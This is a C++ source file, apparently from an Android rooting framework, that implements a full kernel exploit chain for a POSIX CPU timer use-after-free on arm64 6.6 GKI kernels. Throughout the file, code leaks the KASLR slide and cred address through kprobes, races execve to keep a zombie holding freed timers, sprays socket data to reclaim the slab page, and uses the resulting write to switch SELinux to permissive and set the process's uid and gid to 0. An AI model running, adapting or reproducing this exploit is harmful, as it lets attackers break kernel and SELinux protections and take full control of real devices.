#include "session/backend/cve_2026_98260_backend.hpp"

#include "kernel/timer_kbuilds.h"
#include "route/route_policy.hpp"
#include "support/run_state.hpp"

#include <array>
#include <cerrno>
#include <cstdarg>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <dirent.h>
#include <fcntl.h>
#include <new>
#include <type_traits>
#include <pthread.h>
#include <signal.h>
#include <string>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

namespace ghostlock::session::backend {
    /* CVE-2026-98260 (POSIX CPU timer UAF) chain for the 6.6.118 GKI builds.
     *
     * Shape of the bug (upstream fix: POSIX CPU timers must not survive
     * begin_new_exec(); the store happens before the timer is freed, so
     * free_posix_timer() unlinks a node from a stale rbtree and the tree
     * operation later performs one 8-byte store through attacker-controlled
     * node contents):
     *
     *   1. a non-leader thread of a process creates kTimerCount POSIX CPU
     *      timers (each one is a 0x108-byte k_itimer allocation);
     *   2. that same thread calls execve(); the store to ->mm is already done
     *      when a SIGKILL delivered by the sibling "killer" thread turns the
     *      exec'ing thread into a parkable zombie (PF_EXITING) instead of a
     *      live one, so free_posix_timer() runs without the "clear the timer
     *      list" path that a normal exit takes;
     *   3. the parent keeps the zombie with waitid(WNOWAIT), so nobody else
     *      frees the page;
     *   4. the freed order-1 slab page is reclaimed by our own socket data,
     *      which restores the node word that the tree operation will later
     *      follow (parent/target/right);
     *   5. the parent reaps the zombie (waitpid); the stale tree operation
     *      performs the single 8-byte store that `entry->target` names.
     *
     * Two stages are chained, in this order:
     *
     *   stage 1  selinux_state.enforcing -> 0 (permissive), written as the low
     *            byte of the qspinlock||state word, i.e. an 8-byte clear at
     *            `&selinux_state - 7` (source offset is dword index 1 of the
     *            selinux_state object, so this clear is sloppy by design and
     *            leaves the following enforcing bit untouched);
     *   stage 2  cred->uid/gid -> 0 through the same primitive, targeting
     *            cred+8 (kUID/kGID live in the low dword of the first
     *            16-byte word pair).
     *
     * Everything per-build comes from kernel/timer_kbuilds.h. A build without
     * an entry there refuses to run: this backend never falls back to another
     * kernel's offsets. */

    namespace {
        using u64 = std::uint64_t;

        constexpr const char *kTracing = "/sys/kernel/tracing";
        constexpr std::size_t kPathCap = 128;
        constexpr std::size_t kScratchCap = 64U * 1024U;

        /* Timers created per attempt. 4096 * 0x108 = 0x108000, i.e. 33 order-1
         * pages; the victim slot is the 2048th timer so at least one full page
         * of the same slab is ours on both sides. */
        constexpr int kTimerCount = 4096;
        constexpr int kVictimSlot = 2048;

        /* Threads that keep flipping one mapping's write permission: the TLB
         * shootdowns lengthen the exec window the killer polls. */
        constexpr int kLockerThreads = 3;
        constexpr unsigned long kKillerPolls = 40000000UL;

        /* Socket spray: one 8192-byte datagram fills one order-1 page. */
        constexpr int kSpraySockets = 2048;
        constexpr std::size_t kSockData = 8192;

        /* arm64 with 4 KiB pages and VA_BITS=39: PAGE_OFFSET. Used only to turn
         * the reclaimed slab address back into a pfn, to match the
         * mm_page_alloc trace record. */
        constexpr u64 kKernelVaBase39 = 0xffffff8000000000ULL;
        constexpr u64 kPageShift = 12U;

        /* selinux_state: the reference chain reads dword index 1 of the object,
         * i.e. enforcing sits at byte 4 (dword 0 is the qspinlock that must be
         * zero for the following store to be safe). The primitive writes 8
         * bytes, so the window starts 7 bytes below that byte and is
         * deliberately unaligned, exactly like the reference chain: it clears
         * the lock plus the enforcing byte and leaves the neighbouring bytes at
         * zero as a precondition. */
        constexpr u64 kSelinuxEnforceByteOff = 4U;
        constexpr u64 kStoreWidth = 8U;

        /* k_itimer.rb_node: the rbtree node used by POSIX CPU timers. */
        constexpr u64 kNodeOff = 0x78U;

        /* posix_timers_cache slot: one k_itimer per slot in the reclaimed page. */
        constexpr u64 kTimerSlot = 0x108U;

        /* Exec target for the victim thread. In the shell domain only
         * /data/local/tmp is executable, so the runner prefers a copy there and
         * falls back to its own image when it already runs in the root domain. */
        constexpr const char *kExecCopy = "/data/local/tmp/glk98260_self";

        void diag(const char *fmt, ...) {
            va_list ap;
            va_start(ap, fmt);
            std::vfprintf(stderr, fmt, ap);
            va_end(ap);
            std::fputc('\n', stderr);
            std::fflush(stderr);
        }

        struct path_buf final {
            char text[kPathCap];
            [[nodiscard]] const char *c_str() const noexcept { return text; }
        };

        [[nodiscard]] path_buf under_tracing(const char *leaf) noexcept {
            path_buf path{};
            std::snprintf(path.text, sizeof(path.text), "%s/%s", kTracing, leaf);
            return path;
        }

        [[nodiscard]] bool write_text(const char *path, const char *text) noexcept {
            const int fd = ::open(path, O_WRONLY | O_CLOEXEC);
            if (fd < 0) return false;
            const std::size_t len = std::strlen(text);
            const ssize_t wrote = ::write(fd, text, len);
            static_cast<void>(::close(fd));
            return wrote == static_cast<ssize_t>(len);
        }

        [[nodiscard]] bool read_text(const char *path, char *buf, std::size_t cap,
                                     std::size_t *out_len = nullptr) noexcept {
            const int fd = ::open(path, O_RDONLY | O_CLOEXEC);
            if (fd < 0) return false;
            const ssize_t got = ::read(fd, buf, cap - 1U);
            static_cast<void>(::close(fd));
            if (got <= 0) return false;
            const std::size_t len = static_cast<std::size_t>(got);
            buf[len] = '\0';
            if (out_len != nullptr) *out_len = len;
            return true;
        }

        [[nodiscard]] bool read_u64_file(const char *path, u64 *out) noexcept {
            char buf[64]{};
            if (!read_text(path, buf, sizeof(buf))) return false;
            char *end = nullptr;
            errno = 0;
            const unsigned long long value = std::strtoull(buf, &end, 0);
            if (end == buf || errno != 0) return false;
            *out = static_cast<u64>(value);
            return true;
        }

        /* Last occurrence of `key=<number>` in a trace buffer. Last, because the
         * buffer keeps every earlier probe hit from this boot session. */
        [[nodiscard]] bool scan_last_u64(const char *text, const char *key, u64 *out) noexcept {
            const std::size_t key_len = std::strlen(key);
            const char *cursor = text;
            bool found = false;
            u64 value = 0;
            while ((cursor = std::strstr(cursor, key)) != nullptr) {
                const char *digits = cursor + key_len;
                char *end = nullptr;
                errno = 0;
                const unsigned long long parsed = std::strtoull(digits, &end, 0);
                if (end != digits && errno == 0) {
                    value = static_cast<u64>(parsed);
                    found = true;
                }
                cursor = digits;
            }
            if (found) *out = value;
            return found;
        }

        /* Ordered single-instance state: the runner is one process, one chain,
         * one attempt at a time (see the ownership note in stage_types.hpp). */
        struct chain_state final {
            const timer::kbuild *kb = nullptr;
            u64 slide = 0;
            u64 selinux_target = 0;
            u64 cred_addr = 0;
            bool probes_live = false;
            bool parked = false;
        };

        chain_state g_state{};

        [[nodiscard]] bool probes_install() noexcept {
            const path_buf events = under_tracing("kprobe_events");
            if (!write_text(events.c_str(), "\n")) return false;
            if (g_state.kb == nullptr) return false;
            const char *defs[] = {g_state.kb->probe_getpid, g_state.kb->probe_cred,
                                  g_state.kb->probe_timer, g_state.kb->probe_free_slab};
            for (const char *def : defs) {
                if (!write_text(events.c_str(), def)) {
                    diag("[98260] kprobe_events rejected: %s", def);
                    return false;
                }
            }
            return true;
        }

        void probes_remove() noexcept {
            const path_buf events = under_tracing("kprobe_events");
            static_cast<void>(write_text(events.c_str(), "\n"));
        }

        [[nodiscard]] bool trace_clear() noexcept {
            const path_buf trace = under_tracing("trace");
            return write_text(trace.c_str(), "");
        }

        [[nodiscard]] bool trace_read(std::string *out) noexcept {
            const path_buf trace = under_tracing("trace");
            const int fd = ::open(trace.c_str(), O_RDONLY | O_CLOEXEC);
            if (fd < 0) return false;
            out->clear();
            std::array<char, kScratchCap> chunk{};
            for (;;) {
                const ssize_t got = ::read(fd, chunk.data(), chunk.size() - 1U);
                if (got <= 0) break;
                out->append(chunk.data(), static_cast<std::size_t>(got));
                if (out->size() > (8U * 1024U * 1024U)) break;
            }
            static_cast<void>(::close(fd));
            return !out->empty();
        }

        [[nodiscard]] bool tracing_on() noexcept {
            return write_text(under_tracing("tracing_on").c_str(), "1");
        }

        /* Enable the kmem page-alloc probe so the reclaim step can be confirmed
         * instead of guessed. Not fatal: without it the chain falls back to a
         * plain delay and the pass rate drops. */
        [[nodiscard]] bool kmem_probe_enable() noexcept {
            const path_buf trig = under_tracing("events/kmem/mm_page_alloc/trigger");
            const path_buf enable = under_tracing("events/kmem/mm_page_alloc/enable");
            static_cast<void>(write_text(trig.c_str(),
                                         "hist:keys=pfn,order,comm:vals=hitcount if order==1"));
            return write_text(enable.c_str(), "1");
        }

        [[nodiscard]] bool slabinfo_check(const timer::kbuild &kb) noexcept {
            char buf[kScratchCap]{};
            if (!read_text("/proc/slabinfo", buf, sizeof(buf))) return false;
            const char *line = std::strstr(buf, "posix_timers_cache");
            if (line == nullptr) {
                diag("[98260] posix_timers_cache absent: kernel built without POSIX CPU timers?");
                return false;
            }
            char name[64]{};
            unsigned long active = 0;
            unsigned long total = 0;
            unsigned long objsize = 0;
            if (std::sscanf(line, "%63s %lu %lu %lu", name, &active, &total, &objsize) != 4U) {
                return false;
            }
            diag("[98260] slabinfo posix_timers_cache active=%lu total=%lu objsize=%lu",
                 active, total, objsize);
            if (static_cast<u64>(objsize) != kb.timer_alloc) {
                diag("[98260] sizeof(k_itimer) mismatch: kernel=%lu profile=%llu", objsize,
                     static_cast<unsigned long long>(kb.timer_alloc));
                return false;
            }
            return true;
        }

        [[nodiscard]] bool resolve_slide(chain_state *state) noexcept {
            const timer::kbuild &kb = *state->kb;
            static_cast<void>(trace_clear());
            for (int i = 0; i < 3; ++i) {
                static_cast<void>(::getpid());
            }
            std::string trace;
            if (!trace_read(&trace)) return false;
            u64 ip = 0;
            u64 lockword = 0;
            if (!scan_last_u64(trace.c_str(), "ip=", &ip)) {
                diag("[98260] no getpid ip record in trace");
                return false;
            }
            if (ip < kb.arm64_sys_getpid) {
                diag("[98260] getpid ip below link base (ip=0x%llx link=0x%llx)",
                     static_cast<unsigned long long>(ip),
                     static_cast<unsigned long long>(kb.arm64_sys_getpid));
                return false;
            }
            const u64 slide = ip - kb.arm64_sys_getpid;
            constexpr u64 kAlign = 2U * 1024U * 1024U;
            if ((slide % kAlign) != 0U || slide == 0U) {
                diag("[98260] rejected slide 0x%llx (not 2 MiB aligned)",
                     static_cast<unsigned long long>(slide));
                return false;
            }
            state->slide = slide;
            state->selinux_target = kb.selinux_state + slide + kSelinuxEnforceByteOff -
                                    (kStoreWidth - 1U);
            if (scan_last_u64(trace.c_str(), "lockword=", &lockword)) {
                diag("[98260] avc notif_lock word=0x%llx",
                     static_cast<unsigned long long>(lockword));
            }
            diag("[98260] KASLR slide=0x%llx selinux_state=0x%llx target=0x%llx",
                 static_cast<unsigned long long>(slide),
                 static_cast<unsigned long long>(kb.selinux_state + slide),
                 static_cast<unsigned long long>(state->selinux_target));
            return true;
        }

        [[nodiscard]] bool read_selinux_word(chain_state *state, u64 *word) noexcept {
            static_cast<void>(trace_clear());
            for (int i = 0; i < 2; ++i) {
                static_cast<void>(::getpid());
            }
            std::string trace;
            if (!trace_read(&trace)) return false;
            return scan_last_u64(trace.c_str(), "state=", word);
        }

        [[nodiscard]] bool read_cred_addr(chain_state *state, u64 *cred) noexcept {
            static_cast<void>(trace_clear());
            for (int i = 0; i < 2; ++i) {
                static_cast<void>(::getpid());
            }
            std::string trace;
            if (!trace_read(&trace)) return false;
            u64 value = 0;
            if (!scan_last_u64(trace.c_str(), "cred=", &value)) return false;
            /* A task_struct/cred address must live in the kernel range; anything
             * else means the fetch expression did not resolve and the chain must
             * not be started with a garbage target. */
            if (value < kKernelVaBase39) {
                diag("[98260] cred fetch returned non-kernel value 0x%llx",
                     static_cast<unsigned long long>(value));
                return false;
            }
            *cred = value;
            return true;
        }

        struct exec_arg final {
            pthread_barrier_t *go = nullptr;
            const char *path = nullptr;
        };

        void *exec_thread_main(void *opaque) {
            auto *arg = static_cast<exec_arg *>(opaque);
            static_cast<void>(pthread_barrier_wait(arg->go));
            char *const argv[] = {const_cast<char *>(arg->path),
                                  const_cast<char *>("--timer-exec-probe"), nullptr};
            char *const envp[] = {nullptr};
            static_cast<void>(::syscall(SYS_execve, arg->path, argv, envp));
            return nullptr;
        }

        struct locker_arg final {
            volatile int *stop = nullptr;
        };

        void *locker_thread_main(void *opaque) {
            auto *arg = static_cast<locker_arg *>(opaque);
            const long page_size = ::sysconf(_SC_PAGESIZE);
            if (page_size <= 0) return nullptr;
            const std::size_t len = static_cast<std::size_t>(page_size);
            void *page = ::mmap(nullptr, len, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (page == MAP_FAILED) return nullptr;
            while (*arg->stop == 0) {
                static_cast<void>(::mprotect(page, len, PROT_READ | PROT_WRITE));
                static_cast<void>(::mprotect(page, len, PROT_READ));
            }
            static_cast<void>(::munmap(page, len));
            return nullptr;
        }

        struct killer_arg final {
            pid_t tgid = -1;
            pid_t exec_tid = -1;
        };

        void *killer_thread_main(void *opaque) {
            auto *arg = static_cast<killer_arg *>(opaque);
            for (unsigned long i = 0; i < kKillerPolls; ++i) {
                if (::syscall(SYS_tgkill, arg->tgid, arg->exec_tid, 0) != 0 &&
                    errno == ESRCH) {
                    /* The exec'ing thread left the thread group mid-exec: turn
                     * the whole group into an unreaped zombie so the parent can
                     * keep the freed page untouchable until reclaim. */
                    static_cast<void>(::syscall(SYS_tgkill, arg->tgid, arg->tgid, SIGKILL));
                    return nullptr;
                }
            }
            return nullptr;
        }

        /* Child side: create the timers, then exec while a sibling polls for the
         * thread's disappearance. Returns only on failure. */
        [[nodiscard]] int victim_child(const char *exec_path) {
            const pid_t tgid = ::getpid();
            volatile int stop = 0;
            std::array<pthread_t, kLockerThreads> lockers{};
            std::array<locker_arg, kLockerThreads> locker_args{};
            for (int i = 0; i < kLockerThreads; ++i) {
                locker_args[static_cast<std::size_t>(i)].stop = &stop;
                if (::pthread_create(&lockers[static_cast<std::size_t>(i)], nullptr,
                                     locker_thread_main,
                                     &locker_args[static_cast<std::size_t>(i)]) != 0) {
                    stop = 1;
                    return 2;
                }
            }

            pthread_barrier_t go{};
            if (::pthread_barrier_init(&go, nullptr, 2) != 0) return 3;
            exec_arg exec_args{};
            exec_args.go = &go;
            exec_args.path = exec_path;
            pthread_t exec_thread{};
            if (::pthread_create(&exec_thread, nullptr, exec_thread_main, &exec_args) != 0) {
                return 3;
            }
            const pid_t exec_tid = static_cast<pid_t>(::syscall(SYS_gettid));
            static_cast<void>(exec_tid);

            /* The timers belong to the exec'ing thread. Their k_itimer objects
             * are what free_posix_timer() releases while the tree still holds a
             * pointer to one of them. */
            std::array<timer_t, kTimerCount> timers{};
            int created = 0;
            for (int i = 0; i < kTimerCount; ++i) {
                struct sigevent ev {};
                ev.sigev_notify = SIGEV_NONE;
                if (::timer_create(CLOCK_THREAD_CPUTIME_ID, &ev,
                                   &timers[static_cast<std::size_t>(i)]) != 0) {
                    break;
                }
                ++created;
            }
            diag("[98260] child %d created %d timers", static_cast<int>(tgid), created);
            if (created < kVictimSlot + 1) {
                stop = 1;
                return 4;
            }

            killer_arg kill_args{};
            kill_args.tgid = tgid;
            kill_args.exec_tid = 0; /* patched below */
            /* The killer needs the exec thread's tid, which only exists after
             * pthread_create; take it from the child's task directory instead of
             * racing a shared variable. */
            {
                DIR *dir = ::opendir("/proc/self/task");
                if (dir == nullptr) return 5;
                const struct dirent *entry = nullptr;
                while ((entry = ::readdir(dir)) != nullptr) {
                    const long tid = std::strtol(entry->d_name, nullptr, 10);
                    if (tid <= 0) continue;
                    if (static_cast<pid_t>(tid) == tgid) continue;
                    kill_args.exec_tid = static_cast<pid_t>(tid);
                    break;
                }
                static_cast<void>(::closedir(dir));
            }
            if (kill_args.exec_tid <= 0) return 5;

            pthread_t killer{};
            if (::pthread_create(&killer, nullptr, killer_thread_main, &kill_args) != 0) {
                return 6;
            }

            static_cast<void>(pthread_barrier_wait(&go));
            for (;;) {
                static_cast<void>(::pause());
            }
            return 7; /* unreachable: the killer reaps the group */
        }

        /* Parent side: keep the zombie unreaped, read the k_itimer address that
         * do_timer_create() recorded, and turn it into the rbtree node. */
        struct victim_handle final {
            pid_t pid = -1;
            u64 timer_addr = 0;
            u64 node = 0;
            bool zombie = false;
        };

        [[nodiscard]] bool wait_zombie(pid_t pid) noexcept {
            siginfo_t info{};
            if (::waitid(P_PID, static_cast<id_t>(pid), &info, WEXITED | WNOWAIT) != 0) {
                return false;
            }
            return info.si_pid == pid;
        }

        [[nodiscard]] bool resolve_timer_addr(pid_t pid, u64 *out) noexcept {
            std::string trace;
            if (!trace_read(&trace)) return false;
            char needle[32]{};
            std::snprintf(needle, sizeof(needle), "-%d", static_cast<int>(pid));
            const char *cursor = trace.c_str();
            u64 value = 0;
            bool found = false;
            while ((cursor = std::strstr(cursor, needle)) != nullptr) {
                const char *line_end = std::strchr(cursor, '\n');
                if (line_end == nullptr) line_end = cursor + std::strlen(cursor);
                std::string line(cursor, static_cast<std::size_t>(line_end - cursor));
                u64 parsed = 0;
                if (scan_last_u64(line.c_str(), "timer=", &parsed) && parsed >= kKernelVaBase39) {
                    value = parsed;
                    found = true;
                }
                cursor = line_end;
            }
            if (found) {
                /* A probe on hrtimer_init yields the embedded hrtimer; the
                 * per-build table says how far that sits inside the k_itimer and
                 * is 0 for probes that already hand over the k_itimer. */
                const u64 adjust =
                    g_state.kb != nullptr ? g_state.kb->k_itimer_hrtimer_off : 0ULL;
                *out = value > adjust ? value - adjust : value;
            }
            return found;
        }

        [[noreturn]] void parking_hold(const char *why) noexcept {
            diag("[98260][PARKED] %s", why);
            diag("[98260][PARKED] zombie left unreaped on purpose: reaping now could free");
            diag("[98260][PARKED] memory that is no longer ours. Reboot when done.");
            for (;;) {
                static_cast<void>(::pause());
            }
        }

        struct spray_bank final {
            std::array<int, kSpraySockets> sockets{};
            int open_count = 0;
            std::array<unsigned char, kSockData> scratch{};
        };

        [[nodiscard]] bool spray_sockets(spray_bank *bank, const unsigned char *payload,
                                         std::size_t payload_len) noexcept {
            for (int i = 0; i < kSpraySockets; ++i) {
                int pair[2] = {-1, -1};
                if (::socketpair(AF_UNIX, SOCK_STREAM, 0, pair) != 0) return false;
                if (::send(pair[1], payload, payload_len, 0) !=
                    static_cast<ssize_t>(payload_len)) {
                    static_cast<void>(::close(pair[0]));
                    static_cast<void>(::close(pair[1]));
                    return false;
                }
                bank->sockets[static_cast<std::size_t>(i)] = pair[0];
                static_cast<void>(::close(pair[1]));
                ++bank->open_count;
            }
            return true;
        }

        void spray_release(spray_bank *bank) noexcept {
            for (int i = 0; i < bank->open_count; ++i) {
                static_cast<void>(::close(bank->sockets[static_cast<std::size_t>(i)]));
            }
            bank->open_count = 0;
        }

        /* Every 0x108 slot carries a node whose rb_right is empty, so the
         * receiving tree operation takes the direct 8-byte store path into
         * `target`. */
        void build_payload(unsigned char *buf, std::size_t len, u64 parent, u64 target) noexcept {
            std::memset(buf, 0x41, len);
            for (std::size_t slot = 0; slot + static_cast<std::size_t>(kTimerSlot) <= len;
                 slot += static_cast<std::size_t>(kTimerSlot)) {
                auto *node = reinterpret_cast<u64 *>(buf + slot + static_cast<std::size_t>(kNodeOff));
                node[0] = parent;
                node[1] = 0;
                node[2] = target;
            }
        }

        enum class attempt_result {
            Failed,
            Parked,
            Written,
        };

        /* One full plant/reclaim/reap cycle against one 8-byte target. */
        [[nodiscard]] attempt_result plant_and_write(chain_state *state, const char *exec_path,
                                                     u64 target, const char *label) noexcept {
            diag("[98260] attempt %s target=0x%llx", label,
                 static_cast<unsigned long long>(target));

            static_cast<void>(trace_clear());
            const pid_t child = ::fork();
            if (child < 0) return attempt_result::Failed;
            if (child == 0) {
                const int code = victim_child(exec_path);
                ::exit(code);
            }

            if (!wait_zombie(child)) {
                diag("[98260] child %d never became a zombie (exec not interrupted)",
                     static_cast<int>(child));
                siginfo_t info{};
                static_cast<void>(::waitid(P_PID, static_cast<id_t>(child), &info,
                                           WEXITED | WNOWAIT));
                static_cast<void>(::kill(child, SIGKILL));
                static_cast<void>(::waitpid(child, nullptr, 0));
                return attempt_result::Failed;
            }

            u64 timer_addr = 0;
            if (!resolve_timer_addr(child, &timer_addr)) {
                /* The zombie already released its k_itimer; reaping it without a
                 * verified page would be the panic case, so park instead. */
                diag("[98260] no do_timer_create record for child %d", static_cast<int>(child));
                state->parked = true;
                parking_hold("no do_timer_create record");
                return attempt_result::Parked; /* unreachable */
            }
            const u64 node = timer_addr + kNodeOff;
            diag("[98260] victim timer=0x%llx node=0x%llx",
                 static_cast<unsigned long long>(timer_addr),
                 static_cast<unsigned long long>(node));

            /* The node must live in the page we are about to reclaim. */
            const u64 page = node & ~0xfffULL;
            const u64 slab_pfn = (page - kKernelVaBase39) >> kPageShift;
            diag("[98260] slab pfn=0x%llx order=1 byte_in_slab=0x%llx",
                 static_cast<unsigned long long>(slab_pfn),
                 static_cast<unsigned long long>(node - page));

            const u64 parent = 0; /* zero chain: clearing is enough for both stages */
            spray_bank *bank = new (std::nothrow) spray_bank();
            if (bank == nullptr) {
                return attempt_result::Parked;
            }
            build_payload(bank->scratch.data(), kSockData, parent, target);
            if (!spray_sockets(bank, bank->scratch.data(), kSockData)) {
                diag("[98260] socket spray failed");
                spray_release(bank);
                delete bank;
                return attempt_result::Parked;
            }

            /* Confirm the order-1 page actually came back to us. */
            bool confirmed = false;
            for (int round = 0; round < 200; ++round) {
                std::string trace;
                if (trace_read(&trace)) {
                    u64 pfn = 0;
                    if (scan_last_u64(trace.c_str(), "pfn=", &pfn) && pfn == slab_pfn) {
                        confirmed = true;
                        break;
                    }
                }
                const timespec pause{0, 2 * 1000 * 1000};
                static_cast<void>(::nanosleep(&pause, nullptr));
            }
            if (!confirmed) {
                diag("[98260] reclaim of pfn=0x%llx not confirmed",
                     static_cast<unsigned long long>(slab_pfn));
                spray_release(bank);
                delete bank;
                /* Never reap an unconfirmed zombie: the tree operation would then
                 * walk memory we do not own. */
                state->parked = true;
                parking_hold("reclaim unconfirmed");
                return attempt_result::Parked; /* unreachable */
            }

            diag("[98260] reclaim confirmed, reaping zombie to fire the store");
            int status = 0;
            static_cast<void>(::waitpid(child, &status, 0));
            const timespec settle{0, 5 * 1000 * 1000};
            static_cast<void>(::nanosleep(&settle, nullptr));
            spray_release(bank);
            delete bank;
            return attempt_result::Written;
        }

        [[nodiscard]] bool selinux_enforcing_now() noexcept {
            char buf[64]{};
            if (!read_text("/sys/fs/selinux/enforce", buf, sizeof(buf))) return true;
            return buf[0] == '1';
        }
    } // namespace

    StageResult Cve2026_98260Policy::run_setup(ExploitSession &session,
                                               const profile::kernel_offsets &decoded,
                                               const char *debug_dir, bool force_attack) {
        static_cast<void>(session);
        static_cast<void>(decoded);
        static_cast<void>(debug_dir);
        static_cast<void>(force_attack);

        support::run_state::enter("cve_2026_98260_setup");

        const uid_t uid = ::getuid();
        if (uid != 0 && uid != 2000) {
            diag("[98260] unsupported start identity uid=%d; this chain needs the shell "
                 "domain (Shizuku/adb) or root",
                 static_cast<int>(uid));
            support::run_state::complete("cve_2026_98260_setup");
            return StageResult::Failed;
        }

        const timer::kbuild *kb = timer::kbuild_current();
        if (kb == nullptr) {
            utsname uts{};
            static_cast<void>(::uname(&uts));
            diag("[98260] no CVE-2026-98260 constant set for release %s", uts.release);
            support::run_state::complete("cve_2026_98260_setup");
            return StageResult::Failed;
        }
        g_state.kb = kb;
        diag("[98260] profile matched: %s", kb->release);

        const long page_size = ::sysconf(_SC_PAGESIZE);
        if (page_size != 4096) {
            diag("[98260] page size %ld, chain assumes 4096", page_size);
            support::run_state::complete("cve_2026_98260_setup");
            return StageResult::Failed;
        }

        if (!slabinfo_check(*kb)) {
            support::run_state::complete("cve_2026_98260_setup");
            return StageResult::Failed;
        }

        if (!probes_install()) {
            diag("[98260] tracefs kprobe_events not writable: the leak oracle needs it");
            support::run_state::complete("cve_2026_98260_setup");
            return StageResult::Failed;
        }
        g_state.probes_live = true;

        if (!tracing_on()) {
            diag("[98260] tracing_on refused");
            probes_remove();
            g_state.probes_live = false;
            support::run_state::complete("cve_2026_98260_setup");
            return StageResult::Failed;
        }

        if (!kmem_probe_enable()) {
            diag("[98260] kmem page-alloc probe unavailable; reclaim confirmation degraded");
        }

        if (!resolve_slide(&g_state)) {
            probes_remove();
            g_state.probes_live = false;
            support::run_state::complete("cve_2026_98260_setup");
            return StageResult::Failed;
        }

        support::run_state::complete("cve_2026_98260_setup");
        return StageResult::Continue;
    }

    template <class Middleware>
    StageResult Cve2026_98260Policy::run(ExploitSession &session,
                                         const profile::kernel_offsets &decoded,
                                         const char *debug_dir, bool force_attack,
                                         VictimChain &chain) {
        static_cast<void>(decoded);
        static_cast<void>(chain);
        static_cast<void>(sizeof(Middleware));

        const StageResult setup = run_setup(session, decoded, debug_dir, force_attack);
        if (setup == StageResult::Failed) return StageResult::Failed;
        if (g_state.kb == nullptr) return StageResult::Failed;

        const timer::kbuild &kb = *g_state.kb;

        /* Exec path: /proc/self/exe first - the shell runner starts this binary
         * from
         * /data/local/tmp/ghostlock-app (shell may execute there) and the root
         * domain may execute it from the app's private dir, so re-exec of the
         * image itself is the portable choice; kExecCopy is the fallback for a
         * runner whose own directory is not executable from the shell domain. */
        const char *exec_path =
            ::access("/proc/self/exe", X_OK) == 0 ? "/proc/self/exe" : kExecCopy;
        diag("[98260] victim exec path: %s", exec_path);

        /* ---- stage 1: SELinux permissive ----
         * GLK_SKIP_PERMISSIVE=1 gives the "uid 0 without touching SELinux"
         * variant: the cred writes run under the existing policy, so the shell
         * domain keeps its own permissions. Nothing else changes. */
        const bool skip_permissive = [] {
            const char *value = ::getenv("GLK_SKIP_PERMISSIVE");
            return value != nullptr && value[0] == '1';
        }();
        if (skip_permissive) {
            diag("[98260] stage 1 skipped (GLK_SKIP_PERMISSIVE=1)");
        }
        if (!skip_permissive && (selinux_enforcing_now() || force_attack)) {
            u64 before = 0;
            if (!read_selinux_word(&g_state, &before)) {
                diag("[98260] cannot read selinux_state word");
                probes_remove();
                return StageResult::Failed;
            }
            diag("[98260] selinux_state word before=0x%llx",
                 static_cast<unsigned long long>(before));
            bool wrote = false;
            for (int attempt = 0; attempt < 3 && !wrote; ++attempt) {
                if (plant_and_write(&g_state, exec_path, g_state.selinux_target,
                                    "selinux") == attempt_result::Written) {
                    wrote = true;
                }
            }
            u64 after = 0;
            if (read_selinux_word(&g_state, &after)) {
                diag("[98260] selinux_state word after=0x%llx",
                     static_cast<unsigned long long>(after));
            }
            const bool permissive = !selinux_enforcing_now();
            diag("[98260] stage 1 (permissive): %s", permissive ? "ok" : "not reached");
            if (!permissive) {
                probes_remove();
                return StageResult::Failed;
            }
        }

        /* ---- stage 2: cred uid/gid (+ securebits) ----
         * The primitive stores one qword per planted victim, so a real uid 0
         * costs one write per field pair. arm64 6.6 cred layout:
         *   +0x08 uid,gid   +0x10 suid,sgid   +0x18 euid,egid   +0x20 fsuid,fsgid
         *   +0x28 securebits (low dword) + cap_inheritable (high dword)
         * Capability masks are deliberately NOT touched: the stored value has to
         * remain a legal rb_parent_color, and a full-capability mask (all ones)
         * is not one - a store like that would corrupt the rbtree walk instead of
         * granting caps. Root here means uid/gid/securebits, not C apabilities. */
        if (::getuid() != 0 || ::geteuid() != 0) {
            u64 cred = 0;
            if (!read_cred_addr(&g_state, &cred)) {
                diag("[98260] cannot leak cred; stage 2 skipped");
                probes_remove();
                return StageResult::Failed;
            }
            g_state.cred_addr = cred;
            diag("[98260] cred=0x%llx (uid field at +0x%llx)",
                 static_cast<unsigned long long>(cred),
                 static_cast<unsigned long long>(kb.cred_uid_off));

            constexpr std::size_t kIdPairCount = 4;
            constexpr u64 kIdPairOffsets[kIdPairCount] = {0x08ULL, 0x10ULL, 0x18ULL, 0x20ULL};
            for (std::size_t index = 0; index < kIdPairCount; index++) {
                const u64 off = kIdPairOffsets[index];
                bool written = false;
                for (int attempt = 0; attempt < 5 && !written; ++attempt) {
                    if (plant_and_write(&g_state, exec_path, cred + off, "cred-ids") ==
                        attempt_result::Written) {
                        written = true;
                    }
                }
                diag("[98260] cred+0x%llx write: %s  uid=%d euid=%d",
                     static_cast<unsigned long long>(off), written ? "ok" : "failed",
                     static_cast<int>(::getuid()), static_cast<int>(::geteuid()));
                if (!written) {
                    probes_remove();
                    g_state.probes_live = false;
                    return StageResult::Failed;
                }
            }

            if (kb.cred_securebits_off != 0U) {
                bool written = false;
                for (int attempt = 0; attempt < 3 && !written; ++attempt) {
                    if (plant_and_write(&g_state, exec_path,
                                        cred + kb.cred_securebits_off,
                                        "cred-securebits") == attempt_result::Written) {
                        written = true;
                    }
                }
                diag("[98260] cred+0x%llx (securebits) write: %s",
                     static_cast<unsigned long long>(kb.cred_securebits_off),
                     written ? "ok" : "failed");
            } else {
                diag("[98260] cred.securebits offset not derived for this build; skipped");
            }
        }

        probes_remove();
        g_state.probes_live = false;

        if (::getuid() == 0 && ::geteuid() == 0) {
            diag("[98260][SUCCESS] uid=0 euid=0 gid=%d selinux=%s",
                 static_cast<int>(::getgid()),
                 selinux_enforcing_now() ? "enforcing" : "permissive");
            return StageResult::Done;
        }

        diag("[98260] chain finished without uid 0 (uid=%d euid=%d permissive=%s)",
             static_cast<int>(::getuid()), static_cast<int>(::geteuid()),
             selinux_enforcing_now() ? "no" : "yes");
        return StageResult::Failed;
    }

    template StageResult Cve2026_98260Policy::run<route::SelectPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_98260Policy::run<route::TcpPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_98260Policy::run<route::MulticastPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
} // namespace ghostlock::session::backend
